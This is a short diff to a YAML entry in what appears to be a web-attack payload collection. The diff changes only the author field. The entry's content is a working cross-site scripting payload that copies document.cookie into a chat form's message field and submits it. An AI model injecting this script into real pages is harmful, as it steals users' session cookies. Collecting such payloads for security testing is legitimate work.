@@ -3,7 +3,7 @@ metadata:
   filename: "xss-script-submit-form.yaml"
   tags: ["web"]
   created: "2025-04-04"
-  author: "@anakles"
+  authors: ["@anakles"]
 
 content: |
   <script>const form = document.getElementById("chatform");form.elements["msg"].value = document.cookie;form.requestSubmit();</script>
